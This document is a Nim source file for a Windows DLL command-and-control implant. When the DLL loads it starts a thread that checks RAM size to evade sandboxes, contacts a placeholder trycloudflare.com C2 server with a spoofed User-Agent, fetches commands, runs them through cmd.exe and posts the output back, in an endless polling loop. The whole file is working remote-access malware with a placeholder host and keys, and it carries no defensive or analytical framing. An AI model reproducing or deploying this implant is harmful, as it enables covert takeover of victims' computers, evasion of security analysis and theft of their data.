# Nim C2 Agent DLL - Plain text constants
import std/[httpclient, json, os, osproc, strutils, random, net]
import winim/lean

const C2_URL = "https://CHANGE-MECHANGE-ME.trycloudflare.com"
const API_KEY = "00000000000000000000000000000000"
const TOKEN = "00000000000000000000000000000000"

proc runCmd(cmd: string): string =
  try:
    let (output, _) = execCmdEx("cmd.exe /c " & cmd)
    return output
  except:
    return "Error"

proc agentMain() {.exportc, dynlib.} =
  sleep(1000)
  
  # Sandbox check
  var memStatus: MEMORYSTATUSEX
  memStatus.dwLength = cast[DWORD](sizeof(MEMORYSTATUSEX))
  GlobalMemoryStatusEx(addr memStatus)
  if cast[uint64](memStatus.ullTotalPhys) < 2000000000'u64:
    return
  
  randomize()
  let hostname = getEnv("COMPUTERNAME", "agent")
  let agentId = hostname & "-" & toHex(rand(0xFFFF), 4).toLowerAscii()
  
  let cmdUrl = C2_URL & "/bits/cmd/" & agentId & "?key=" & TOKEN
  let resultUrl = C2_URL & "/bits/result/" & agentId & "?key=" & TOKEN
  
  var client = newHttpClient(timeout = 30000)
  client.headers = newHttpHeaders({
    "X-API-Key": API_KEY,
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
  })
  
  while true:
    try:
      let resp = client.getContent(cmdUrl)
      var cmd = ""
      try:
        let j = parseJson(resp)
        if j.hasKey("command") and j["command"].kind != JNull:
          cmd = j["command"].getStr()
      except:
        cmd = resp.strip()
      
      if cmd.len > 0:
        var output = runCmd(cmd)
        if output.len == 0:
          output = "[OK]"
        client.headers["Content-Type"] = "application/json"
        discard client.postContent(resultUrl, $(%*{"result": output}))
    except:
      discard
    sleep(4000)

proc NimMain() {.cdecl, importc.}

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  if fdwReason == DLL_PROCESS_ATTACH:
    NimMain()
    var threadId: DWORD
    discard CreateThread(nil, 0, cast[LPTHREAD_START_ROUTINE](agentMain), nil, 0, addr threadId)
  return TRUE
